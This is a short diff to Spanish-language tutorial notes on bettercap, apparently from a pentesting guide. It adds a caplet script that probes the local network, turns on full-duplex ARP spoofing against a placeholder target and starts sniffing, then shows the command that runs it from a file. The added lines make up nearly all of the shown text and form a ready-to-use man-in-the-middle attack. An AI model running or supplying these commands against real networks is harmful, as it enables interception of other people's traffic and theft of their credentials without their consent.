@@ -48,6 +48,12 @@ ahora podemos ver la informacion enviada en http
 
 script para bettercap podemos poner todos estos comandos en un archivo de texto y guardarlo con extencion .cap para ejecutarlos simultaneamente la proxima vez  
 ```
+net.probe on 
+set arp.spoof.fullduplex true  
+set arp.spoof.targets x.x.x.x  
+arp.spoof on 
+net.sniff on 
+
 bettercap -iface eth0 -caplet file.cap  
 ```
 
